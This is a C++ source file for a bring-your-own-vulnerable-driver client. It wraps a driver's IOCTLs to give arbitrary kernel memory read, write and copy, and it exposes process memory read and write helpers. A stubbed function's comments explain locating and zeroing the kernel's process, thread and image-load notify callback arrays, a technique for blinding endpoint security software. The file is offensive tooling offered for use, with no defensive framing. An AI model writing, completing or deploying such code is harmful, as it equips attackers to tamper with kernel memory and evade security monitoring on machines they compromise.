#include "byovd_client.h"
#include <winioctl.h>

#define IOCTL_READ  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MEMCPY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

struct KERNEL_READ_REQUEST  { uint64_t addr; void* buffer; size_t size; };
struct KERNEL_WRITE_REQUEST { uint64_t addr; const void* buffer; size_t size; };
struct KERNEL_MEMCPY_REQUEST { uint64_t dst; uint64_t src; size_t size; };

static HANDLE g_drv = INVALID_HANDLE_VALUE;

namespace BYOVD {

    bool Open(const wchar_t* devicePath) {
        g_drv = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        return g_drv != INVALID_HANDLE_VALUE;
    }

    void Close() { 
        if (g_drv != INVALID_HANDLE_VALUE) CloseHandle(g_drv); 
        g_drv = INVALID_HANDLE_VALUE;
    }

    bool IsOpen() {
        return g_drv != INVALID_HANDLE_VALUE;
    }

    bool KRead(uint64_t addr, void* buffer, size_t size) {
        KERNEL_READ_REQUEST req{ addr, buffer, size };
        DWORD ret; return DeviceIoControl(g_drv, IOCTL_READ, &req, sizeof(req), nullptr, 0, &ret, nullptr);
    }

    bool KWrite(uint64_t addr, const void* buffer, size_t size) {
        KERNEL_WRITE_REQUEST req{ addr, buffer, size };
        DWORD ret; return DeviceIoControl(g_drv, IOCTL_WRITE, &req, sizeof(req), nullptr, 0, &ret, nullptr);
    }

    bool KMemcpy(uint64_t dst, uint64_t src, size_t size) {
        KERNEL_MEMCPY_REQUEST req{ dst, src, size };
        DWORD ret; return DeviceIoControl(g_drv, IOCTL_MEMCPY, &req, sizeof(req), nullptr, 0, &ret, nullptr);
    }

    void WipeKernelCallbacks() {
        // requires kernel driver to resolve PspLoadImageNotifyRoutine, 
        // PspCreateThreadNotifyRoutine, PspCreateProcessNotifyRoutineEx
        // then KWrite zero buffer (512 bytes each)
        // pattern scan for arrays in ntoskrnl.exe — per-build offsets
    }

    bool KernelReadProcessMemory(HANDLE pid, uint64_t addr, void* buffer, size_t size) {
        return KRead(addr, buffer, size);
    }

    bool KernelWriteProcessMemory(HANDLE pid, uint64_t addr, const void* buffer, size_t size) {
        return KWrite(addr, buffer, size);
    }

    bool HidePhysicalPages(uint64_t va, size_t size) {
        return false;
    }

} // namespace BYOVD